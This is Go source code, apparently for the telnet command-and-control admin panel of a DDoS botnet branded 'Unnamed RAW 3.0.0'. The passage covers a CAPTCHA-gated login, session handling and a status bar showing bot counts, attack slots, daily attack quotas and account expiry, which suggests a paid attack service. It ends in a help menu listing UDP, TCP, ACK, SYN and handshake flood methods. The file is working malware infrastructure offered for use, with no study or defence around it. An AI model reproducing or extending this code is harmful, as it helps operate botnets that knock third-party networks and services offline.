package main

import (
    "crypto/sha256"
    "fmt"
    "log"
    "sort"
    "math/rand"
    "net"
    "strings"
    "time"
    "os"
    "strconv"
    "sync"
    "io"
)


type Admin struct {
	conn net.Conn
}

var (
    activeSessions = make(map[string]net.Conn)
    sessionsMutex  sync.Mutex
)

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}


func (this *Admin) writePrompt(prompt string) error {
	_, err := this.conn.Write([]byte("\x1b[38;5;231m" + prompt))
	return err
}

func generateCaptcha(length int) string {
	const characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	rand.Seed(time.Now().UnixNano())
	result := make([]byte, length)
	for i := 0; i < length; i++ {
		result[i] = characters[rand.Intn(len(characters))]
	}
	return string(result)
}

func getRandomColor() (string, string) {
	colors := []struct {
		code string
		name string
	}{
		{"\033[91m", "red"},
		{"\033[92m", "green"},
		{"\033[94m", "blue"},
		{"\033[93m", "yellow"},
		{"\033[95m", "magenta"},
		{"\033[96m", "cyan"},
	}
	choice := colors[rand.Intn(len(colors))]
	return choice.code, choice.name
}

func createColoredCaptcha(captcha string) (string, []string, string) {
	const RESET = "\033[0m"
	display := []string{}
	correctChars := []string{}
	targetColorCode, targetColorName := getRandomColor()

	for _, char := range captcha {
		var colorCode, colorName string
		if rand.Float32() < 0.1 { // 10% chance to be the target color
			colorCode, colorName = targetColorCode, targetColorName
			correctChars = append(correctChars, string(char))
		} else {
			colorCode, colorName = getRandomColor()
			for colorName == targetColorName {
				colorCode, colorName = getRandomColor()
			}
		}
		display = append(display, fmt.Sprintf("%s%c%s", colorCode, char, RESET))
	}

	return strings.Join(display, ""), correctChars, targetColorName
}


// hashChars generates a SHA-256 hash of the concatenated characters
func hashChars(chars []string) string {
	hash := sha256.Sum256([]byte(strings.Join(chars, "")))
	return fmt.Sprintf("%x", hash)
}

// runCaptcha manages the CAPTCHA verification process
func (this *Admin) runCaptcha(maxAttempts int, timeLimit time.Duration) bool {
    this.conn.Write([]byte(fmt.Sprintf("\033]0;CAPTCHA\007")))
	this.conn.Write([]byte("\033[2J\033[1H")) // Clear screen
	this.conn.Write([]byte("\r\n"))

	attempts := 0
	for attempts < maxAttempts {
		captcha := generateCaptcha(5)
		coloredCaptcha, correctChars, targetColor := createColoredCaptcha(captcha)
		if len(correctChars) == 0 { // Ensure at least one correct character
			continue
		}
		captchaHash := hashChars(correctChars)

		this.conn.Write([]byte("CAPTCHA: " + coloredCaptcha + "\r\n"))

		this.conn.SetDeadline(time.Now().Add(timeLimit))
		this.conn.Write([]byte(fmt.Sprintf("Enter the %s characters: ", targetColor)))
		userInput, err := this.ReadLine(false)
		if err != nil {
			if err.Error() == "i/o timeout" {
				this.conn.Write([]byte("\r\nTime limit exceeded!\r\n"))
			} else {
				return false
			}
		}

		if hashChars([]string{userInput}) == captchaHash {
			this.conn.Write([]byte("\r\nCAPTCHA verification \x1b[32msuccessful\x1b[0m!\r\n"))
            time.Sleep(time.Duration(700) * time.Millisecond)

			return true
		} else {
			attempts++
			remaining := maxAttempts - attempts
			if remaining > 0 {
				this.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[31mIncorrect\x1b[0m characters. %d attempt(s) remaining.\r\n\r\n", remaining)))
                time.Sleep(time.Duration(1200) * time.Millisecond)
                this.conn.Write([]byte("\033[2J\033[1H"))
			} else {
				this.conn.Write([]byte("\r\nCAPTCHA verification \x1b[31mfailed\x1b[0m. Too many incorrect attempts.\r\n"))
                time.Sleep(time.Duration(1200) * time.Millisecond)
				return false
			}
		}
	}
	return false
}

// Handle manages the login process with CAPTCHA
func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h")) // Switch to alternate screen buffer
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22")) // Telnet negotiations

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()

	// Run CAPTCHA before login
	if !this.runCaptcha(3, 120*time.Second) {
		return
	}


    this.conn.Write([]byte(fmt.Sprintf("\033]0;Please enter your credentials.\007")))
    this.conn.SetDeadline(time.Now().Add(300 * time.Second))
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\x1b[38;5;135mUsername:\x1b[0m "))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(300 * time.Second))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\x1b[38;5;135mPassword:\x1b[0m\x1b[38;5;231m "))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(300 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'V', 'e', 'r', 'i', 'f', 'y', '.', '.', '.'}
    for i := 0; i < 15; i++ {
        this.conn.Write([]byte(fmt.Sprintf("\033]0;Waiting...\007")))
        this.conn.Write(append([]byte("\r\x1b[38;5;117m💫 \x1b[38;5;231m"), spinBuf[i%len(spinBuf)]))
        time.Sleep(time.Duration(35) * time.Millisecond)
    }
    this.conn.Write([]byte("\r\n"))

    // Attempt to log in and handle the result
    loggedIn, userInfo, errMsg := database.TryLogin(username, password)
    if !loggedIn {
        this.conn.Write([]byte("\r\x1b[31m" + errMsg + "\x1b[0m\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    locked := true
    sessionsMutex.Lock()

    if _, exists := activeSessions[username]; exists {
        sessionsMutex.Unlock()
        locked = false

        this.conn.Write([]byte("\r\x1b[38;5;231mAnother session is active. Close it? (y/n): \x1b[0m"))
        this.conn.SetReadDeadline(time.Now().Add(30 * time.Second))
        response, err := this.ReadLine(false)
        this.conn.SetReadDeadline(time.Time{})

        if err != nil || strings.ToLower(strings.TrimSpace(response)) != "y" {
            this.conn.Write([]byte("\r\x1b[31mLogin denied.\x1b[0m\r\n"))
            return
        }

        sessionsMutex.Lock()
        locked = true

        if currentConn, stillExists := activeSessions[username]; stillExists {
            currentConn.Close()
            delete(activeSessions, username)
        }
    }

    // Add the new session
    activeSessions[username] = this.conn
    if locked {
        sessionsMutex.Unlock()
    }

    // Set up cleanup when this session ends
    defer func() {
        sessionsMutex.Lock()
        if conn, exists := activeSessions[username]; exists && conn == this.conn {
            delete(activeSessions, username)
        }
        sessionsMutex.Unlock()
    }()

    banner_sel := rand.Intn(5) + 1

    if banner_sel == 1 {
        this.conn.Write([]byte("\033[2J\033[1;1H"))
        this.conn.Write([]byte("\x1b[38;5;135m           _,'|             _.-''``-...___..--';)\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m          /_ \\'.      __..-' ,      ,--...--'''\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m         <\\    .`--'''       `     /'\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m          `-';'               ;   ; ;\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m    __...--''     ___...--_..'  .;.'\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m   (,__....----'''       (,..--''\n\r"))
        this.conn.Write([]byte("\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m         Unnamed RAW 3.0.0\n\r"))
    } else if banner_sel == 2 {
        this.conn.Write([]byte("\033[2J\033[1;1H"))
        this.conn.Write([]byte("\x1b[38;5;135m                      (`.-,')\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m                    .-'     ;\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m                _.-'   , `,-\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m          _ _.-'     .'  /._\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m        .' `  _.-.  /  ,'._;)\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m       (       .  )-| (\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m        )`,_ ,'_,'  \\_;)\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m('_  _,'.'  (___,))\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m `-:;.-'\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m        Unnamed RAW 3.0.0\n\r"))
    } else if banner_sel == 3 {
        this.conn.Write([]byte("\033[2J\033[1;1H"))
        this.conn.Write([]byte("\x1b[38;5;135m    \\`*-.                    \n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m     )  _`-.                 \n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m    .  : `. .                \n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m    : _   '  \\               \n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m    ; *` _.   `*-._          \n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m    `-.-'          `-.       \n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m      ;       `       `.     \n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m      :.       .        \\    \n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m      . \\  .   :   .-'   .   \n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m      '  `+.;  ;  '      :   \n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m      :  '  |    ;       ;-. \n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m      ; '   : :`-:     _.`* ;\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m   .*' /  .*' ; .*`- +'  `*' \n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m   `*-*   `*-*  `*-*'\n\r"))
        this.conn.Write([]byte("\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m     Unnamed RAW 3.0.0\n\r"))
    } else if banner_sel == 4 {
        this.conn.Write([]byte("\033[2J\033[1;1H"))
        this.conn.Write([]byte("\x1b[38;5;135m  ⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m  ⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m  ⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m  ⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m  ⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m  ⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m  ⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀⠀\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m  ⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m  ⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m  ⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀⠀⠀\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m  ⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n\r"))
        this.conn.Write([]byte("\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m          Unnamed RAW 3.0.0\n\r"))
    } else if banner_sel == 5 {
        this.conn.Write([]byte("\033[2J\033[1;1H"))
        this.conn.Write([]byte("\x1b[38;5;135m   ⠀⠀⡿⠀⠀⠀⠀⠈⠳⡀⠀⢰⡒⠲⠶⢤⣀⠀⠀⠀⢠⠞⠉⠀⠀⠀⠀⠀⢸⡆\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m   ⠀⢸⠇⠀⠀⠀⠀⠀⠀⠙⢦⡈⣷⠀⠀⠀⠈⠓⢤⣰⠏⠀⠀⠀⠀⠀⠀⠀⢸⡇\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m   ⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⣀⡿⠞⠓⠀⠀⠀⠀⠀⠙⠦⠀⠀⠀⠀⠀⠀⠀⢸⡇\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m   ⠀⣿⠀⠀⠀⠀⠀⠀⠀⠈⠛⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m   ⠀⢸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠃\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m   ⠀⠀⢿⡀⠀⠠⣤⣤⣤⣤⣤⣤⡄⠀⠀⠀⠀⣰⣶⣶⣶⠒⢲⡖⠀⠀⠀⣠⠟⠀\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m   ⣠⣤⣀⣳⡄⠀⡟⠀⠀⣿⣿⣿⡃⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⣷⠀⢠⡾⠯⢤⡄\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m   ⠹⣦⡈⠉⠁⠸⡇⠀⠀⢿⣿⣿⠀⠀⠀⠀⠀⠙⣿⣿⠏⠀⠀⣿⠀⠀⢀⣴⠋⠀   \x1b[38;5;231m<---- this is bumpkin :3\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m   ⠀⠈⢙⡷⢠⡀⣝⡄⠀⠀⠉⠁⠀⠉⠉⠀⠀⠀⠀⠀⠀⢠⢶⡰⠀⠀⢻⡅⠀⠀\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m   ⠀⢀⡿⠀⠀⠈⠁⠀⠀⠀⠀⠠⠤⠴⠖⠒⠒⠚⠁⠀⠀⠀⠉⠀⡀⠀⢀⣹⣆⠀\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m   ⠀⠘⠓⠒⠛⠙⠶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡴⠖⠋⠉⠉⠉⠉⠁⠀\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m   ⠀⠀⠀⠀⠀⠀⠀⠀⠻⣌⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m   ⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m   ⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠀⠀⠀⠀⠀⠀\n\r"))
        this.conn.Write([]byte("\n\r"))
        this.conn.Write([]byte("\x1b[38;5;135m            Unnamed RAW 3.0.0\n\r"))
    }

    this.conn.Write([]byte("\r\n\x1b[0m"))
    this.conn.Write([]byte("\n\r"))

    go func() {
        spinner := []string{"/", "-", "\\", "|"}
        i := 0
        for {
            latestUserInfo, err := database.GetUserInfo(username)
            if err != nil {
                continue
            }
            var BotCount int
            if clientList.Count() > latestUserInfo.MaxBots && latestUserInfo.MaxBots != -1 {
                BotCount = latestUserInfo.MaxBots
            } else {
                BotCount = clientList.Count()
            }

            title := ""
            var dailyAttackStr string
            if latestUserInfo.DailyAttackMax == 0 {
                dailyAttackStr = "inf"
            } else {
                dailyAttackStr = fmt.Sprintf("%d/%d", latestUserInfo.DailyAttackCount, latestUserInfo.DailyAttackMax)
            }

            if latestUserInfo.Admin {
                title = fmt.Sprintf("\033]0;[%s]  Bots: %d  ~  User: %s  ~  Slots: %d/%d  ~  Total: %d  ~  Daily: %s",
                    spinner[i%len(spinner)], BotCount, username, database.fetchRunningAttacks(), database.globalMaxConcurrentAttacks, database.fetchAttacks(), dailyAttackStr)
            } else {
                title = fmt.Sprintf("\033]0;[%s]  Bots: %d  ~  User: %s  ~  Slots: %d/%d  ~  Daily: %s",
                    spinner[i%len(spinner)], BotCount, username, database.fetchRunningAttacks(), database.globalMaxConcurrentAttacks, dailyAttackStr)
            }

            if latestUserInfo.Expiry == 0 {
                title += "  ~  Expiry: never"
            } else {
                remainingSeconds := latestUserInfo.Expiry - time.Now().Unix()
                if remainingSeconds > 0 {
                    remainingDays := remainingSeconds / (24 * 3600)
                    title += fmt.Sprintf("  ~  Expiry: %d days", remainingDays)
                }
            }
            title += "\007"

            if _, err := this.conn.Write([]byte(title)); err != nil {
                this.conn.Close()
                break
            }

            i++
            time.Sleep(500 * time.Millisecond)
            if i%240 == 0 {
                this.conn.SetDeadline(time.Now().Add(1200 * time.Second))
            }
        }
    }()

    for {
        this.conn.Write([]byte("\x1b[38;5;135m" + username + "\x1b[38;5;27m@\x1b[38;5;93munnamed ~# \x1b[0m"))
        cmd, err := this.ReadLine(false)

        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }

        if cmd == "" {
            continue
        }

        if err != nil || cmd == "cls" || cmd == "clear" || cmd == "c" {
            rand.Seed(time.Now().UnixNano())

            banner_sel := rand.Intn(5) + 1

            if banner_sel == 1 {
                this.conn.Write([]byte("\033[2J\033[1;1H"))
                this.conn.Write([]byte("\x1b[38;5;135m           _,'|             _.-''``-...___..--';)\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m          /_ \\'.      __..-' ,      ,--...--'''\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m         <\\    .`--'''       `     /'\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m          `-';'               ;   ; ;\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m    __...--''     ___...--_..'  .;.'\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m   (,__....----'''       (,..--''\n\r"))
                this.conn.Write([]byte("\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m         Unnamed RAW 3.0.0\n\r"))
            } else if banner_sel == 2 {
                this.conn.Write([]byte("\033[2J\033[1;1H"))
                this.conn.Write([]byte("\x1b[38;5;135m                      (`.-,')\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m                    .-'     ;\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m                _.-'   , `,-\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m          _ _.-'     .'  /._\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m        .' `  _.-.  /  ,'._;)\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m       (       .  )-| (\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m        )`,_ ,'_,'  \\_;)\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m('_  _,'.'  (___,))\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m `-:;.-'\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m        Unnamed RAW 3.0.0\n\r"))
            } else if banner_sel == 3 {
                this.conn.Write([]byte("\033[2J\033[1;1H"))
                this.conn.Write([]byte("\x1b[38;5;135m    \\`*-.                    \n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m     )  _`-.                 \n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m    .  : `. .                \n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m    : _   '  \\               \n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m    ; *` _.   `*-._          \n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m    `-.-'          `-.       \n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m      ;       `       `.     \n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m      :.       .        \\    \n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m      . \\  .   :   .-'   .   \n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m      '  `+.;  ;  '      :   \n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m      :  '  |    ;       ;-. \n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m      ; '   : :`-:     _.`* ;\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m   .*' /  .*' ; .*`- +'  `*' \n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m   `*-*   `*-*  `*-*'\n\r"))
                this.conn.Write([]byte("\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m     Unnamed RAW 3.0.0\n\r"))
            } else if banner_sel == 4 {
                this.conn.Write([]byte("\033[2J\033[1;1H"))
                this.conn.Write([]byte("\x1b[38;5;135m  ⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m  ⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m  ⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m  ⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m  ⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m  ⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m  ⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀⠀\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m  ⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m  ⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m  ⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀⠀⠀\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m  ⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n\r"))
                this.conn.Write([]byte("\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m          Unnamed RAW 3.0.0\n\r"))
            } else if banner_sel == 5 {
                this.conn.Write([]byte("\033[2J\033[1;1H"))
                this.conn.Write([]byte("\x1b[38;5;135m   ⠀⠀⡿⠀⠀⠀⠀⠈⠳⡀⠀⢰⡒⠲⠶⢤⣀⠀⠀⠀⢠⠞⠉⠀⠀⠀⠀⠀⢸⡆\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m   ⠀⢸⠇⠀⠀⠀⠀⠀⠀⠙⢦⡈⣷⠀⠀⠀⠈⠓⢤⣰⠏⠀⠀⠀⠀⠀⠀⠀⢸⡇\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m   ⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⣀⡿⠞⠓⠀⠀⠀⠀⠀⠙⠦⠀⠀⠀⠀⠀⠀⠀⢸⡇\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m   ⠀⣿⠀⠀⠀⠀⠀⠀⠀⠈⠛⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m   ⠀⢸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠃\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m   ⠀⠀⢿⡀⠀⠠⣤⣤⣤⣤⣤⣤⡄⠀⠀⠀⠀⣰⣶⣶⣶⠒⢲⡖⠀⠀⠀⣠⠟⠀\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m   ⣠⣤⣀⣳⡄⠀⡟⠀⠀⣿⣿⣿⡃⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⣷⠀⢠⡾⠯⢤⡄\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m   ⠹⣦⡈⠉⠁⠸⡇⠀⠀⢿⣿⣿⠀⠀⠀⠀⠀⠙⣿⣿⠏⠀⠀⣿⠀⠀⢀⣴⠋⠀   \x1b[38;5;231m<---- this is bumpkin :3\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m   ⠀⠈⢙⡷⢠⡀⣝⡄⠀⠀⠉⠁⠀⠉⠉⠀⠀⠀⠀⠀⠀⢠⢶⡰⠀⠀⢻⡅⠀⠀\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m   ⠀⢀⡿⠀⠀⠈⠁⠀⠀⠀⠀⠠⠤⠴⠖⠒⠒⠚⠁⠀⠀⠀⠉⠀⡀⠀⢀⣹⣆⠀\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m   ⠀⠘⠓⠒⠛⠙⠶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡴⠖⠋⠉⠉⠉⠉⠁⠀\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m   ⠀⠀⠀⠀⠀⠀⠀⠀⠻⣌⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m   ⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m   ⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠀⠀⠀⠀⠀⠀\n\r"))
                this.conn.Write([]byte("\n\r"))
                this.conn.Write([]byte("\x1b[38;5;135m            Unnamed RAW 3.0.0\n\r"))
            }

            this.conn.Write([]byte("\n\r"))
            this.conn.Write([]byte("\r\n\x1b[0m"))
            continue
        }
        if cmd == "help" || cmd == "HELP" || cmd == "?" || cmd == "methods" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[38;5;135m                       Unnamed RAW Methods\r\n"))
            this.conn.Write([]byte("\x1b[38;5;135mudp          \x1b[38;5;231m-->   \x1b[0mStandard UDP flood (less DGRAM packets)\r\n"))
            this.conn.Write([]byte("\x1b[38;5;135mwra          \x1b[38;5;231m-->   \x1b[0mHandshake flood (TCP handshake)\r\n"))
            this.conn.Write([]byte("\x1b[38;5;135mtcp          \x1b[38;5;231m-->   \x1b[0mCustom TCP flag flood (URG/ACK/SYN)\r\n"))
            this.conn.Write([]byte("\x1b[38;5;135mack          \x1b[38;5;231m-->   \x1b[0mPure ACK flood (high bandwidth usage)\r\n"))
            this.conn.Write([]byte("\x1b[38;5;135msyn          \x1b[38;5;231m-->   \x1b[0mSYN-only flood (queue exhaustion)\r\n"))
